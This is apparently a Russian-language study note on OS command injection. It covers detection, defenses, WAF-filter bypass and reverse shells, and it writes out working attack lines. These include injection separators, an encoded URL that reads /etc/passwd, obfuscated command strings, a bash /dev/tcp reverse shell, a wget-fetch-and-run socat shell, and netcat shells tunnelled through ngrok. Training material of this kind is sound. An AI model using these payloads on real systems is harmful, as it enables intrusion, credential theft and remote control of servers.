# $ cmdi

Created: January 5, 2025 12:55 PM
Tags: refreshers

# Command Injection

Command injection (CMDi) или внедрение команд операционной
системы – это атака, направленная на выполнение команд
операционной системы на удаленном компьютере, осуществление
которой возможно благодаря уязвимому веб-приложению.

Обычно такой уязвимостью обладает код, который напрямую вызывает функции выполнения команд на уровне OS, например shell_exec.

## Нахождение CMDi

Простейший способ найти уязвимость в поле ввода / куки / хедере и так далее — перебрать типичные для системы сервера (UNIX или Windows) пейлоады.

Для этого можно в BurpSuite Intruder использовать Sniper attack со словарями из репозиториев с пейлоадами:

```bash
PayloadsAllTheThings-master/Command Injection
/Intruder/ command-execution-unix.txt
```

![image.png]($%20cmdi/image.png)

## **Защита от Command Injection**

1. **Использование встроенных API**:
    - Применяйте функции языка программирования (например, `mkdir("dir name")`), вместо системных команд (например, `mkdir /dir_name`).
2. **Экранирование метасимволов**:
    - Используйте встроенные функции для экранирования, такие как `escapeshellarg()` или `escapeshellcmd()` в PHP.
3. **Параметризация и валидация входных данных**:
    - Применяйте механизмы, которые отделяют команды от аргументов, и проверяйте вводимые данные:
        - Для команд используйте whitelist.
        - Для параметров — регулярные выражения.

## Способы обхода защиты

### 1. Определение наличия WAF

Используйте следующие инструменты для проверки наличия WAF на веб-приложении:

- `nmap -p80 --script http-waf-detect <host>` — определяет, защищено ли приложение WAF.
- `nmap -p80 --script http-waf-fingerprint <host>` — определяет наличие и версию WAF.
- `wafw00f.py <url>` — Python-скрипт для идентификации WAF.

### 2. Проверка фильтров WAF

Для тестирования фильтров WAF можно использовать различные подстановочные знаки. Примеры команд:

- `; ls`
- `%0a ls`
- `$(ls)`
- `'ls'`
- `& ls` или `%26`
- `&& ls` или `%26%26`
- `| ls`
- `|| ls`

Пример URL с экранированием:

```
<http://example.com/some-dir/userData.php?dir=%3Bcat%20%2Fetc%2Fpasswd>
```

### 3. Использование подстановочных знаков

На Linux можно использовать подстановочные знаки в Bash для обхода фильтров:

- Пример: строка `cat /etc/passwd` может быть преобразована в `/???/??t /???/??ss??`, где `?` заменяется на любые символы.

### 4. Конкатенация строковых литералов

Преобразовать строку `/bin/ls` можно так:

- `'/b'i'n/l's'` — выполнится как оригинал.

### 5. Двойной обратный слеш

Использование двойного обратного слеша может выглядеть так:

- `/b\\\\in/l\\\\s`

### 6. Неинициализированные переменные Bash

Неинициализированные переменные обрабатываются как пустые строки:

- Пример: `cat$a /etc#$a/passwd$a` выполнится как `cat /etc/passwd`.

### OS Shell (Bind/Reverse)

**Шелл** — это доступ к командной оболочке удалённой системы. В контексте информационной безопасности различают два типа шеллов: **Bind Shell (прямой)** и **Reverse Shell (обратный)**.

- **Bind Shell**: Бэкдор прослушивает порт на удалённом компьютере, ожидая подключения.
- **Reverse Shell**: Удалённый компьютер инициирует запрос к машине атакующего, где запущена программа для управления бэкдором.

**Использование**:

- Прямой шелл подходит для машин с белым IP.
- Обратный шелл используется, если удалённый компьютер за NAT или его файрвол блокирует входящие соединения.

### Инструменты для создания Reverse Shell

### 1. Netcat

**Netcat** — инструмент для создания TCP и UDP соединений. Чтобы получить обратный шелл:

- На уязвимом сайте:
    
    ```bash
    nc 123.456.789.321 4444
    ```
    
- На атакующей машине:
    
    ```bash
    nc -lnvp 4444
    ```
    

**Проблема**: Вероятность наличия Netcat на сервере низка.

### 2. Bash

Если Netcat не доступен, можно использовать стандартные оболочки, такие как **Bash**. Для создания Reverse Shell через bash:

- Создайте пейлоад с помощью сайта [Online Reverse Shell Generator](https://www.revshells.com/).
- Введите команду:
    
    ```bash
    bash -c 'exec bash -i &>/dev/tcp/IP/4444 <&1'
    ```
    

Если соединение успешно, вы получите доступ к командной оболочке.

### 3. Python

Если нужен интерактивный шелл (TTY), используйте:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### 4. Socat

Если Python отсутствует, можно использовать **Socat**. Установите Socat на сервер через wget:

```bash
wget -q <https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat> -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:5555
```

### 5. Ngrok

**Ngrok** — это сервис, который позволяет создавать обратные соединения, даже если у вас отсутствует публичный IP-адрес. Вот пошаговое руководство по его использованию:

### Установка Ngrok

1. **Регистрация**: Зарегистрируйтесь на сайте [Ngrok](https://www.ngrok.com/) или используйте аккаунт Google.
2. **Скачивание**: Скачайте программу для вашей операционной системы и сохраните её в удобное место.
3. **Изучение команды**: Ознакомьтесь с командами, выполнив `./ngrok` в терминале.

### Создание обратного соединения

**На атакующем компьютере:**

1. Запустите Ngrok:
    
    ```bash
    ngrok tcp 4444
    ```
    
    Это позволит вашему реверс-шеллу принимать входящие соединения и перенаправлять их на порт 4444.
    
2. Запустите Netcat для прослушивания порта:
    
    ```bash
    nc -lnvp 4444
    ```
    
    После перенаправления соединения на этот порт у вас откроется shell-оболочка.
    

**На компьютере жертвы:**

1. Запустите реверс-шелл. Например:
    
    ```bash
    nc 0.tcp.ngrok.io 17300 -e /bin/bash
    ```
    
    Это инициирует соединение с атакующим компьютером.
    
2. Для получения интерактивного TTY-шелла используйте Python:
    
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    

Теперь вы сможете взаимодействовать с оболочкой удаленного сервера в интерактивном режиме.

## Автоэксплуатация CMDi

С помощью утилиты commix можно автоматически эксплуатировать CMDi уязвимости

![image.png]($%20cmdi/image%201.png)

---

[6.3.Command injection.pdf]($%20cmdi/6.3.Command_injection.pdf)

[notes.txt]($%20cmdi/notes.txt)

1. [Шпаргалка по CMDI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
2. [Понятие и эксплуатация](https://hackware.ru/?p=1133)